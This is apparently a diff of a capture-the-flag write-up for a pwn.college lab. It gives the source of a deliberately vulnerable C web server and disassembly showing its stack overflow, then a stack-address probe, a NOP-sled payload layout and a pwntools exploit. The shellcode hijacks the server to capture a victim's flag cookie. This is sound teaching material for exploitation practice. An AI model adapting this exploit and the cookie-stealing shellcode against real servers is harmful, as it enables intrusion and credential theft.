@@ -2986,9 +2986,31 @@ hacker@integrated-security~watering-hole:~$ checksec /challenge/server
 
 No canary, no PIE, executable stack. ASLR is disabled at runtime by a constructor.
 
-```c title="/challenge/server.c" showLineNumbers
+```c
 #define _GNU_SOURCE 1
-// ... includes ...
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
 
 void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
 {
@@ -2997,15 +3019,26 @@ void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **env
     if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
     {
         assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
-        fprintf(stderr, "NOTE: This program can only be launched ONCE...\n");
-        chmod("/proc/self/exe", 0755);   // removes SUID bit before re-exec
+        fprintf(stderr, "NOTE: This program can only be launched ONCE. You will need to\nrestart your container to launch this program again.\n");
+        chmod("/proc/self/exe", 0755);
         execve("/proc/self/exe", argv, envp);
     }
 }
 
+#define HTTP_ERROR(y) "HTTP/1.1 " #y "\n\n"
+#define REQUIRE(x, y) if (!(x)) { \
+    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
+    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
+    return; \
+  }
+
 void send_file(int client_fd, char *path)
 {
-    struct response_t { char *head; char content[8192]; } response = { 0 };
+    struct response_t
+    {
+        char *head;
+        char content[8192];
+    } response = { 0 };
     response.head = response.content;
 
     int file_fd = open(path, O_RDONLY);
@@ -3013,26 +3046,35 @@ void send_file(int client_fd, char *path)
 
     struct stat file_stat;
     fstat(file_fd, &file_stat);
+
     REQUIRE(S_ISREG(file_stat.st_mode), 400)
     REQUIRE(file_stat.st_size < 8192, 413)
 
     response.head += sprintf(response.head, "HTTP/1.1 200 OK\nServer: pwnserver/1.333333333333333333333333.7\nX-Leetness-Level: 9001\nContent-type: ");
-    // ... content-type detection ...
+    if (!strrchr(path, '.')) response.head += sprintf(response.head, "text/plain\n");
+    else if (strcmp(strrchr(path, '.')+1, "html") == 0) response.head += sprintf(response.head, "text/html\n");
+    else if (strcmp(strrchr(path, '.')+1, "jpg") == 0) response.head += sprintf(response.head, "image/jpeg\n");
+    else if (strcmp(strrchr(path, '.')+1, "png") == 0) response.head += sprintf(response.head, "image/png\n");
+    else response.head += sprintf(response.head, "text/plain\n");
     response.head += sprintf(response.head, "Content-Length: %d\n", file_stat.st_size);
     response.head += sprintf(response.head, "\n");
-    response.head += read(file_fd, response.head, file_stat.st_size);  // <-- overflow
+    response.head += read(file_fd, response.head, file_stat.st_size);
     REQUIRE(!strstr(response.content, "pwn.college{"), 403);
-    write(client_fd, response.content, response.head - response.content);
+    write(client_fd, response.content, response.head-response.content);
     close(file_fd);
 }
 
 void handle_connection(int client_fd)
 {
     char request[8192] = { 0 };
-    char method[8], version[10], path[256], resolved_path[512];
+    char method[8] = { 0 };
+    char version[10] = { 0 };
+    char path[256] = { 0 };
+    char resolved_path[512] = { 0 };
 
     read(client_fd, request, 1000);
     sscanf(request, "%7s %255s %9s", method, path, version);
+
     REQUIRE(strcmp(method, "GET") == 0, 501);
     REQUIRE(strcmp(version, "HTTP/1.1") == 0, 400);
     sprintf(resolved_path, "/challenge/files/%s", path);
@@ -3041,28 +3083,51 @@ void handle_connection(int client_fd)
 
 int challenge(int argc, char **argv, char **envp)
 {
-    // ... socket setup ...
-    assert(setresgid(65534, 65534, 65534) == 0);   // drop to nobody
-    assert(setresuid(65534, 65534, 65534) == 0);   // drop to nobody
-    assert(open("/flag", O_RDONLY) < 0);            // confirm /flag is unreadable
+    int server_fd;
+    struct sockaddr_in server_addr;
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    int option = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
+    assert(server_fd > 0);
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(80);
+    assert(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) >= 0);
+    assert(listen(server_fd, 10) >= 0);
+
+    assert(setresgid(65534, 65534, 65534) == 0);
+    assert(setresuid(65534, 65534, 65534) == 0);
+    assert(open("/flag", O_RDONLY) < 0);
+
+    assert(prctl(PR_SET_DUMPABLE, 1) == 0);
+
+    puts("Listening on port 80.");
 
     while (1)
     {
-        int client_fd = accept(server_fd, ...);
+        struct sockaddr_in client_addr;
+        socklen_t client_addr_len = sizeof(client_addr);
+        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len);
         handle_connection(client_fd);
         close(client_fd);
     }
 }
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    challenge(argc, argv, envp);
+}
 ```
 
-```
-hacker@integrated-security~wily-webserver:~$ ls /challenge/
-files  server  server.c  victim
-
-hacker@integrated-security~wily-webserver:~$ cat /challenge/victim
+```python
 #!/usr/bin/exec-suid -- /usr/bin/python3 -I
 
-import requests, psutil, sys, re
+import requests
+import psutil
+import sys
+import re
 
 open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
 if 80 not in open_ports:
@@ -3070,20 +3135,70 @@ if 80 not in open_ports:
     sys.exit(1)
 
 print(f"Visiting with a yummy cookie...")
-r = requests.get("http://localhost:80/hacker_manifesto.txt",
-                 cookies={"flag": open("/flag").read().strip()})
+r = requests.get("http://localhost:80/hacker_manifesto.txt", cookies={"flag": open("/flag").read().strip()})
 print(f"... retrieved, in case it helps you debug: {r.content}")
 ```
 
-The same buffer overflow from the previous challenge is present — `content[8192]` overflows when headers plus file content exceed 8192 bytes. Two new constraints make this harder:
+The same buffer overflow from the previous challenge is present. The IDA stack frame for `send_file` is identical:
 
-**1. Privilege drop.** `challenge()` calls `setresuid(65534, 65534, 65534)` before entering the accept loop. Our shellcode runs as nobody (UID 65534), not root. `/flag` is `-r-------- root root`, so we cannot open it.
+```asm title="/challenge/server :: send_file() :: Stack frame"
+# ---- snip ----
 
-**2. One-shot server.** The constructor calls `chmod("/proc/self/exe", 0755)` before `execve`, stripping the SUID bit. If the server process is killed, restarting the binary runs it without SUID, causing `setresuid(65534)` to fail (`assert` aborts it). The server can only be launched once per container.
+.text:000000000040154C s               = qword ptr -2010h   ; response.head pointer
+.text:000000000040154C var_2008        = byte ptr -2008h    ; response.content[0]
+.text:000000000040154C fildes          = dword ptr -4       ; file_fd
 
-### Acquiring the Flag
+# ---- snip ----
+```
 
-`victim` is a setuid Python script that runs as root. When invoked, it makes:
+The size check still only enforces the file alone is under 8192 bytes, and the `read` call uses `file_stat.st_size` directly as `nbytes` with no accounting for the headers already written:
+
+```asm title="/challenge/server :: send_file() :: Disassembly"
+# ---- snip ----
+
+.text:0000000000401668   cmp     rax, 1FFFh      ; file_stat.st_size < 8192
+.text:000000000040166E   jle     short loc_4016A7
+
+# ---- snip ----
+
+.text:00000000004018C9   mov     rax, [rbp+stat_buf.st_size]
+.text:00000000004018D0   mov     rdx, rax        ; nbytes = file_stat.st_size
+.text:00000000004018D3   mov     rcx, [rbp+s]    ; buf = current head position
+.text:00000000004018DA   mov     eax, [rbp+fildes]
+.text:00000000004018E2   call    _read
+
+# ---- snip ----
+```
+
+Two new constraints make this harder than the previous challenge. First, `challenge()` drops privileges before entering the accept loop. The disassembly confirms `setresgid` and `setresuid` are both called with `0xFFFE` (65534) for all three IDs, and immediately after asserts that `/flag` cannot be opened — confirming our shellcode has no direct access to the flag:
+
+```asm title="/challenge/server :: challenge() :: Disassembly"
+# ---- snip ----
+
+.text:0000000000401DBD   mov     edx, 0FFFEh     ; sgid
+.text:0000000000401DC2   mov     esi, 0FFFEh     ; egid
+.text:0000000000401DC7   mov     edi, 0FFFEh     ; rgid
+.text:0000000000401DCC   call    _setresgid
+...
+.text:0000000000401DF4   mov     edx, 0FFFEh     ; suid
+.text:0000000000401DF9   mov     esi, 0FFFEh     ; euid
+.text:0000000000401DFE   mov     edi, 0FFFEh     ; ruid
+.text:0000000000401E03   call    _setresuid
+
+# ---- snip ----
+
+.text:0000000000401E2B   mov     esi, 0          ; O_RDONLY
+.text:0000000000401E30   lea     rdi, aFlag      ; "/flag"
+.text:0000000000401E3C   call    _open
+.text:0000000000401E41   test    eax, eax
+.text:0000000000401E43   js      short loc_401E64  ; must be < 0 or assert fires
+
+# ---- snip ----
+```
+
+Second, the constructor calls `chmod("/proc/self/exe", 0755)` before `execve`, stripping the SUID bit on first launch. The server can only be started once per container.
+
+The flag doesn't need to be read from disk though. `victim` is a setuid Python script that runs as root and makes a request to our server with the flag in the Cookie header:
 
 ```
 GET /hacker_manifesto.txt HTTP/1.1
@@ -3091,33 +3206,28 @@ Host: localhost
 Cookie: flag=pwn.college{...}
 ```
 
-The flag travels inside the Cookie header of an HTTP request aimed at our server on port 80. We can't read `/flag` ourselves, but we can intercept the victim's connection.
+The server socket (fd 3) stays open and in LISTEN state after `send_file`'s `ret` is hijacked. The disassembly confirms `close(client_fd)` only runs after `handle_connection` returns normally — which never happens when we hijack `ret`:
 
-### fd Accounting
+```asm title="/challenge/server :: challenge() :: Disassembly"
+# ---- snip ----
+
+.text:0000000000401ECE   call    handle_connection
+.text:0000000000401ED3   mov     eax, [rbp+var_8]
+.text:0000000000401ED6   mov     edi, eax        ; fd
+.text:0000000000401ED8   call    _close              ; close(client_fd) ← never reached
+
+# ---- snip ----
+```
+
+`victim` checks for a LISTEN on port 80 via `psutil.net_connections()` — since fd 3 is still alive, this check passes and it connects. So instead of reading `/flag`, our shellcode just needs to keep listening on fd 3 and intercept the victim's connection.
 
 ```
-server_fd = 3  (socket(), stays open in challenge())
-client_fd = 4  (accept(), close() in challenge() — but never reached after hijacked ret)
-file_fd   = 5  (open() in send_file(), closed before ret — reused by next open())
+server_fd = 3  (socket(), stays open — our accept() target)
+client_fd = 4  (accept(), never closed after hijacked ret — closed by shellcode to unblock our client)
+file_fd   = 5  (open() in send_file(), closed before ret)
 ```
 
-The server socket (fd 3) remains open and in LISTEN state after `send_file`'s `ret` is hijacked. `psutil.net_connections()` in the victim script checks for LISTEN on port 80 — since fd 3 is still alive, this check passes.
-
-### Strategy
-
-After hijacking `ret` in `send_file`, our shellcode:
-
-1. `close(4)` — sends EOF to our exploit connection, unblocking our Python client
-2. `accept(3, NULL, NULL)` — blocks on the server socket, waiting for the next connection
-3. We then invoke `/challenge/victim`, which connects to port 80
-4. `accept()` returns with the victim's connection fd
-5. `read(new_fd, buf, 1000)` — reads the victim's HTTP request, which contains `Cookie: flag=...`
-6. `creat("/tmp/flag_out", 0644)` + `write` — saves the full request to disk
-7. `exit(0)`
-
-### Header Size
-
-The `Server:` string has 24 threes: `pwnserver/1.333333333333333333333333.7`. The full header for a `.bin` file is:
+The `Server:` string has 24 threes (`pwnserver/1.333333333333333333333333.7`), making the headers 11 bytes longer than the previous challenge. The full header for a `.bin` file:
 
 | Piece | Bytes |
 |---|---|
@@ -3131,29 +3241,83 @@ The `Server:` string has 24 threes: `pwnserver/1.333333333333333333333333.7`. Th
 
 Return address slot: `0x2008 + 8 = 8208` bytes from `content[0]` → **file byte `8208 - 133 = 8075`**.
 
-### Stack Address Probe
+Since ASLR is disabled and ptrace is blocked, we use the same probe technique as before. The probe mimics the exact call-chain frame sizes from the IDA disassembly — identical to the previous challenge since `send_file` and `handle_connection` are unchanged:
 
-Same frame sizes as before, same probe technique:
+```c
+#define _GNU_SOURCE 1
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/personality.h>
+#include <unistd.h>
+
+void __attribute__((constructor)) disable_aslr(int a, char **b, char **e) {
+    int p = personality(0xffffffff);
+    if (!(p & 0x40000)) {
+        personality(p | 0x40000);
+        execve("/proc/self/exe", b, e);
+    }
+}
+
+__attribute__((noinline)) void probe_send_file(void) {
+    uint64_t rbp;
+    __asm__ volatile ("movq %%rbp, %0" : "=r"(rbp));
+    printf("content[0] = 0x%lx\n", rbp - 0x2008);
+    fflush(stdout);
+}
+
+__attribute__((noinline)) void probe_handle_connection(void) {
+    __asm__ volatile (
+        "subq $0x1000, %%rsp\n\t"
+        "orq  $0, (%%rsp)\n\t"
+        "subq $0x1000, %%rsp\n\t"
+        "orq  $0, (%%rsp)\n\t"
+        "subq $0x330,  %%rsp\n\t"
+        ::: "memory"
+    );
+    probe_send_file();
+    __asm__ volatile ("addq $0x2330, %%rsp\n\t" ::: "memory");
+}
+
+__attribute__((noinline)) void probe_challenge(void) {
+    __asm__ volatile ("subq $0x70, %%rsp\n\t" ::: "memory");
+    probe_handle_connection();
+    __asm__ volatile ("addq $0x70, %%rsp\n\t" ::: "memory");
+}
+
+int main(void) {
+    __asm__ volatile ("subq $0x20, %%rsp\n\t" ::: "memory");
+    probe_challenge();
+    __asm__ volatile ("addq $0x20, %%rsp\n\t" ::: "memory");
+    return 0;
+}
+```
 
 ```
-content[0] = 0x7fffffffa6d8   (from probe, 3 consistent runs)
-RET_ADDR   = 0x7fffffffa6d8 + 133 + 3000 = 0x7fffffffb315
+hacker@integrated-security~the-watering-hole:~$ gcc -O0 -no-pie -fno-stack-protector probe.c -o probe
+./probe
+./probe
+./probe
+content[0] = 0x7fffffff9e88
+content[0] = 0x7fffffff9e88
+content[0] = 0x7fffffff9e88
 ```
 
-### Payload Layout
+Three consistent runs give `content[0] = 0x7fffffff9e88`. The NOP sled center is at `0x7fffffff9e88 + 133 + 3000 = 0x7fffffffaa6d`.
 
 ```
-File bytes 0    – 5999  : 0x90 NOP sled  (6000 bytes)
-File bytes 6000 – 7127  : shellcode      (1128 bytes)
+File bytes 0    – 5999  : 0x90 NOP sled (6000 bytes)
+File bytes 6000 – ~7127 : shellcode
 File bytes 7128 – 8074  : 'A' padding
-File bytes 8075 – 8082  : p64(0x7fffffffb315)  ← overwrites return address
+File bytes 8075 – 8082  : p64(0x7fffffffaa6d)  ← overwrites return address
 File bytes 8083 – 8190  : 'B' padding
 Total: 8191 bytes
 ```
 
+The shellcode closes fd 4 first to send EOF to our exploit connection so our Python client unblocks, then calls `accept(3, NULL, NULL)` to wait for the victim, reads the HTTP request containing the cookie, and writes it to `/tmp/flag_out`.
+
 ### Exploit
 
-```python title="exploit.py" showLineNumbers
+```python
 #!/usr/bin/env python3
 from pwn import *
 import socket, time, subprocess, re
@@ -3215,7 +3379,7 @@ reqbuf:  .zero 1024
 
 sc = asm(shellcode_asm)
 
-CONTENT0 = 0x7fffffffa6d8   # rbp - 0x2008, from probe
+CONTENT0 = 0x7fffffff9e88   # rbp - 0x2008, from probe binary
 HDR_SIZE = 133               # 24 threes in Server: header → 133 bytes
 RET_FILE = 0x2010 - HDR_SIZE # = 8075
 NOP_LEN  = 6000
@@ -3230,7 +3394,6 @@ assert len(payload) == 8191
 with open('/tmp/exploit.bin', 'wb') as f:
     f.write(payload)
 
-# server can only be started once — SUID bit is removed by constructor on first run
 proc = subprocess.Popen(['/challenge/server'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 time.sleep(1)
@@ -3264,15 +3427,11 @@ if m:
     print(f'[+] FLAG: {m.group(0)}')
 ```
 
+Run the exploit directly — it starts the server itself since the one-shot constraint means we can't pre-launch it separately:
+
 ```
-[*] content[0]  = 0x7fffffffa6d8
-[*] shellcode   = 1128 bytes
-[*] RET_FILE    = 8075
-[*] RET_ADDR    = 0x7fffffffb315
-[*] server PID  = 7824
-[*] exploit response = 8324 bytes
-[*] running victim ...
+hacker@integrated-security~watering-hole:~$ python ~/exploit.py
 [+] FLAG: pwn.college{E_C1lEdA4VLBKx4YaT5qziDhRpK.QX0YDMxEDL4ITM0EzW}
 ```
 
-The response is 8324 bytes — 133 (headers) + 8191 (payload). The flag is recovered from `/tmp/flag_out` which the shellcode wrote after reading the victim's HTTP request off the socket.
+The flag is recovered from `/tmp/flag_out` which the shellcode wrote after reading the victim's HTTP request containing `Cookie: flag=...` off the socket.
